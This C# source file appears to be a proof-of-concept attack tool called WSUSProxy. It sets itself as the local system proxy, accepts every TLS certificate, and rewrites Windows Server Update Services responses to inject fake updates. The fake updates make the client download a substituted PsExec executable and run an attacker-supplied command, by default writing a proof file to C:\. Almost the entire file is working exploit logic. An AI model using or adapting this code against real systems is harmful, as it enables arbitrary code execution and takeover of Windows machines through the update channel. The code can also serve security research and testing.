using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Xml;
using Titanium.Web.Proxy;
using Titanium.Web.Proxy.EventArguments;
using Titanium.Web.Proxy.Exceptions;
using Titanium.Web.Proxy.Models;

namespace WSUSProxy
{
    class Proxy
    {
        private readonly SemaphoreSlim @lock = new SemaphoreSlim(1);
        private readonly ProxyServer proxyServer;
        private ExplicitProxyEndPoint explicitEndPoint;
        private InternetExplorerProxyManager proxyManager;

        private short flagStep = 0;

        private readonly int updateID1;
        private readonly int updateID2;
        private readonly int deploymentID1;
        private readonly int deploymentID2;
        private readonly string uuid1;
        private readonly string uuid2;

        private readonly bool isDebug;
        private readonly bool isHTTPS;
        private readonly string wsusHost;
        private readonly string psExecPath;

        private readonly string executedCommand;

        public Proxy(string wsusHost, bool isHTTPS, string psExecPath) : this(wsusHost, isHTTPS, psExecPath, "cmd /c \"echo 1 > C:\\mitmdump_poc.txt\"")
        { }

        public Proxy(string wsusHost, bool isHTTPS, string psExecPath, string executedCommand) : this(wsusHost, isHTTPS, psExecPath, executedCommand, false)
        { }

        public Proxy(string wsusHost, bool isHTTPS, string psExecPath, string executedCommand, bool debug)
        {
            this.isDebug = debug;
            this.isHTTPS = isHTTPS;
            this.wsusHost = wsusHost;
            this.psExecPath = psExecPath;
            this.executedCommand = WebUtility.HtmlEncode(WebUtility.HtmlEncode(executedCommand));

            // Generate our update IDs
            Random rnd = new Random();
            this.updateID1 = rnd.Next(900000, 999999);
            this.updateID2 = rnd.Next(900000, 999999);
            this.deploymentID1 = rnd.Next(80000, 99999);
            this.deploymentID2 = rnd.Next(80000, 99999);
            this.uuid1 = Guid.NewGuid().ToString();
            this.uuid2 = Guid.NewGuid().ToString();

            // Setup the proxy
            proxyServer = new ProxyServer(false, false, false);

            // Silent all exceptions and ensure we never crash and cause DoS
            proxyServer.ExceptionFunc = async exception =>
            {
                if (exception is ProxyHttpException phex)
                {
                    await writeToConsole(exception.Message + ": " + phex.InnerException?.Message, ConsoleColor.Red);
                }
                else
                {
                    await writeToConsole(exception.ToString(), ConsoleColor.Red);
                }
            };

            proxyServer.ReuseSocket = false;
            proxyServer.EnableConnectionPool = false;

            //TODO: Make proxy aware
            proxyServer.ForwardToUpstreamGateway = false;

            proxyManager = new InternetExplorerProxyManager();
        }

        public void Start()
        {
            proxyServer.BeforeRequest += onRequest;
            proxyServer.BeforeResponse += onResponse;

            //proxyServer.EnableWinAuth = true;

            explicitEndPoint = new ExplicitProxyEndPoint(IPAddress.Loopback, 13337);

            // Fired when a CONNECT request is received
            explicitEndPoint.BeforeTunnelConnectRequest += onBeforeTunnelConnectRequest;

            // Fired upon cert validation
            proxyServer.ServerCertificateValidationCallback += OnCertificateValidation;

            // An explicit endpoint is where the client knows about the existence of a proxy
            // So client sends request in a proxy friendly manner
            proxyServer.AddEndPoint(explicitEndPoint);
            proxyServer.Start();
        
            foreach (var endPoint in proxyServer.ProxyEndPoints)
            {
                Console.WriteLine("Listening on '{0}' endpoint at Ip {1} and port: {2} ", endPoint.GetType().Name,
                    endPoint.IpAddress, endPoint.Port);
            }

            // Set us as the new proxy
            if (this.isHTTPS)
            {
                proxyManager.setProxy(ProxyTypes.HTTPS, "127.0.0.1", 13337);
            }
            else
            {
                proxyManager.setProxy(ProxyTypes.HTTP, "127.0.0.1", 13337);
            }
        }

        public void Stop()
        {
            explicitEndPoint.BeforeTunnelConnectRequest -= onBeforeTunnelConnectRequest;
            proxyServer.ServerCertificateValidationCallback -= OnCertificateValidation;

            proxyServer.BeforeRequest -= onRequest;
            proxyServer.BeforeResponse -= onResponse;

            proxyServer.Stop();
            
            proxyServer.RestoreOriginalProxySettings();
        }

        //private async Task<IExternalProxy> onGetCustomUpStreamProxyFunc(SessionEventArgsBase arg)
        //{
        //    // this is just to show the functionality, provided values are junk
        //    return new ExternalProxy
        //    {
        //        BypassLocalhost = false,
        //        HostName = "127.0.0.9",
        //        Port = 9090,
        //        Password = "fake",
        //        UserName = "fake",
        //        UseDefaultCredentials = false
        //    };
        //}
        
        private async Task onBeforeTunnelConnectRequest(object sender, TunnelConnectSessionEventArgs e)
        {
            string hostname = e.HttpClient.Request.RequestUri.Host;
            await writeDebugToConsole("Tunnel to: " + hostname);

            var clientLocalIp = e.ClientLocalEndPoint.Address;
            if (!clientLocalIp.Equals(IPAddress.Loopback) && !clientLocalIp.Equals(IPAddress.IPv6Loopback))
            {
                e.HttpClient.UpStreamEndPoint = new IPEndPoint(clientLocalIp, 0);
            }

            if (wsusHost != null && !hostname.Contains(wsusHost))
            {
                e.DecryptSsl = false;
            }
        }

        // intercept & cancel redirect or update requests
        private async Task onRequest(object sender, SessionEventArgs e)
        {
            var clientLocalIp = e.ClientLocalEndPoint.Address;
            if (!clientLocalIp.Equals(IPAddress.Loopback) && !clientLocalIp.Equals(IPAddress.IPv6Loopback))
            {
                e.HttpClient.UpStreamEndPoint = new IPEndPoint(clientLocalIp, 0);
            }

            string hostname = e.HttpClient.Request.RequestUri.Host;

            await writeDebugToConsole("Active Client Connections:" + ((ProxyServer)sender).ClientConnectionCount);
            await writeDebugToConsole(e.HttpClient.Request.Url);

            // We inject into the WSUS dance
            if (hostname.Contains(wsusHost))
            {
                if (e.HttpClient.Request.HasBody)
                {
                    string requestBody = await e.GetRequestBodyAsString();

                    if (requestBody.Contains("<InstalledNonLeafUpdateIDs>") && !requestBody.Contains("<HardwareIDs>"))
                    {
                        await writeToConsole("---- Got request for stage 1 ----");
                        flagStep = 1;
                    }
                    else if (requestBody.Contains("<revisionIDs>"))
                    {
                        await writeToConsole("---- Got request for stage 2 ----");
                        flagStep = 2;
                    }
                }
                else if (e.HttpClient.Request.RequestUri.AbsoluteUri.Contains(".exe"))
                {
                    // return file
                    e.Ok(File.ReadAllBytes(psExecPath));
                }
            }
        }
        
        private async Task onResponse(object sender, SessionEventArgs e)
        {
            await writeDebugToConsole("Active Server Connections:" + ((ProxyServer)sender).ServerConnectionCount);

            string hostname = e.HttpClient.Request.RequestUri.Host;
            if (hostname.Contains(wsusHost))
            {
                string body = await e.GetResponseBodyAsString();

                if (flagStep == 1 && body.Contains("<SyncUpdatesResult>"))
                {
                    if (e.HttpClient.Response.StatusCode == (int)HttpStatusCode.OK)
                    {
                        string newUpdatesTemplate = WSUSProxy.Properties.Resources.NewUpdatesTemplate;
                        newUpdatesTemplate = String.Format(newUpdatesTemplate, updateID1, deploymentID1, uuid1, uuid2, updateID2, deploymentID2, uuid2);

                        XmlDocument newUpdatesNode = new XmlDocument();
                        newUpdatesNode.LoadXml(newUpdatesTemplate);

                        XmlDocument doc = new XmlDocument();
                        doc.LoadXml(body);

                        // If there are real Update or OutOfScopeRevisionIDs tags, delete the node
                        XmlNodeList updateNodes = doc.SelectNodes(String.Format("//*[local-name()='{0}']", "NewUpdates"));
                        foreach (XmlNode deletedNode in updateNodes)
                        {
                            deletedNode.ParentNode.RemoveChild(deletedNode);
                        }

                        XmlNodeList changedUpdateNodes = doc.SelectNodes(String.Format("//*[local-name()='{0}']", "ChangedUpdates"));
                        foreach (XmlNode deletedNode in changedUpdateNodes)
                        {
                            deletedNode.ParentNode.RemoveChild(deletedNode);
                        }

                        XmlNodeList outOfScopeRevisionNodes = doc.SelectNodes(String.Format("//*[local-name()='{0}']", "OutOfScopeRevisionIDs"));
                        foreach (XmlNode deletedNode in outOfScopeRevisionNodes)
                        {
                            deletedNode.ParentNode.RemoveChild(deletedNode);
                        }

                        XmlNode syncNode = doc.SelectSingleNode(String.Format("//*[local-name()='{0}']", "SyncUpdatesResult"));

                        XmlNode importedNewUpdatesNode = syncNode.OwnerDocument.ImportNode(newUpdatesNode.FirstChild, true);
                        syncNode.PrependChild(importedNewUpdatesNode);

                        // Small hack to handle the namespace during the XML merges above
                        string returnedBody = doc.OuterXml.Replace("<NewUpdates xmlns=\"\">", "<NewUpdates>");

                        e.SetResponseBodyString(returnedBody);

                        await writeToConsole("---- First stage on the way ----");
                    }

                    flagStep = 0;
                }
                else if (flagStep == 2)
                {
                    List<HttpHeader> soapActionHeaders = e.HttpClient.Request.Headers.GetHeaders("SOAPAction");

                    if (soapActionHeaders.Count > 0 && soapActionHeaders[0].Value.Contains("GetExtendedUpdateInfo"))
                    {
                        string payloadURL = "http://wsusisagoldmine:8530/Content/B2/FB0A150601470195C47B4E8D87FCB3F50292BEB2.exe";
                        string secondPhaseTemplate = WSUSProxy.Properties.Resources.ExtendedUpdateInfoTemplate;
                        secondPhaseTemplate = String.Format(secondPhaseTemplate, updateID2, executedCommand, updateID1, updateID1, updateID2, payloadURL);

                        // TODO: I do not know if that works
                        if (e.HttpClient.Response.StatusCode == 500)
                        {
                            e.HttpClient.Response.StatusCode = 200;
                            e.HttpClient.Response.StatusDescription = "OK";
                        }

                        e.SetResponseBodyString(secondPhaseTemplate);

                        await writeToConsole("---- Second stage on the way ----");
                    }

                    flagStep = 0;
                }
            }
        }

        /// <summary>
        ///     Allows overriding default certificate validation logic
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        public Task OnCertificateValidation(object sender, CertificateValidationEventArgs e)
        {
            e.IsValid = true;

            // To make this 4.5 compatible, we have to use this instead of return Task.CompletedTask;
            return Task.FromResult(0);
        }

        private async Task writeDebugToConsole(string message, ConsoleColor? consoleColor = null)
        {
            if (this.isDebug)
            {
                await writeToConsole(message, consoleColor);
            }
        }

        private async Task writeToConsole(string message, ConsoleColor? consoleColor = null)
        {
            await @lock.WaitAsync();

            if (consoleColor.HasValue)
            {
                ConsoleColor existing = Console.ForegroundColor;
                Console.ForegroundColor = consoleColor.Value;
                Console.WriteLine(message);
                Console.ForegroundColor = existing;
            }
            else
            {
                Console.WriteLine(message);
            }

            @lock.Release();
        }
    }
}
